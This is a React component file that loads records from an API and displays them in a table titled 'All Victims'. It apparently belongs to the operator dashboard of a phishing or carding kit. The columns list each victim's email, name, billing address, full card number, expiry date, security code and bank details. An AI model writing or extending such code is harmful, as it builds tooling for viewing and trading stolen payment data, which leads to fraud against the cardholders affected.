import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './AllUsersInfoTable.css';

const AllUsersInfoTable = () => {
  const [usersInfo, setUsersInfo] = useState([]);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchUsersInfo = async () => {
      try {
        const response = await axios.get(`${process.env.REACT_APP_API_URL}/api/user`);
        setUsersInfo(response.data);
        setLoading(false);
      } catch (error) {
        console.error('Error fetching users info:', error);
        setError('Error fetching users information');
        setLoading(false);
      }
    };

    fetchUsersInfo();
  }, []);

  if (loading) {
    return <div>Loading...</div>;
  }

  if (error) {
    return <div>{error}</div>;
  }

  return (
    <div className="all-users-info-table">
      <h2>All Victims</h2>
      <table>
        <thead>
          <tr>
            <th>Victim ID</th>
            <th>Email</th>
            <th>First Name</th>
            <th>Last Name</th>
            <th>Billing Street</th>
            <th>Billing City</th>
            <th>Billing State</th>
            <th>Billing Postal Code</th>
            <th>Credit Card Number</th>
            <th>Credit Card Expiry Date</th>
            <th>Credit Card Security Code</th>
            <th>Bank Name</th>
            <th>Bank Country</th>
            <th>Card Scheme</th>
            <th>Card Type</th>
            <th>Card Brand</th>
          </tr>
        </thead>
        <tbody>
          {usersInfo.map((userInfo, index) => (
            <tr key={index}>
              <td>{userInfo.user._id}</td>
              <td>{userInfo.user.email}</td>
              <td>{userInfo.billingInfo?.fName}</td>
              <td>{userInfo.billingInfo?.lName}</td>
              <td>{userInfo.billingInfo?.street}</td>
              <td>{userInfo.billingInfo?.city}</td>
              <td>{userInfo.billingInfo?.state}</td>
              <td>{userInfo.billingInfo?.postalCode}</td>
              <td>{userInfo.creditCardInfo?.cardNumber}</td>
              <td>{userInfo.creditCardInfo?.expiryDate}</td>
              <td>{userInfo.creditCardInfo?.securityCode}</td>
              <td>{userInfo.bankInfo?.bank.name}</td>
              <td>{userInfo.bankInfo?.country.name}</td>
              <td>{userInfo.bankInfo?.scheme}</td>
              <td>{userInfo.bankInfo?.type}</td>
              <td>{userInfo.bankInfo?.brand}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default AllUsersInfoTable;
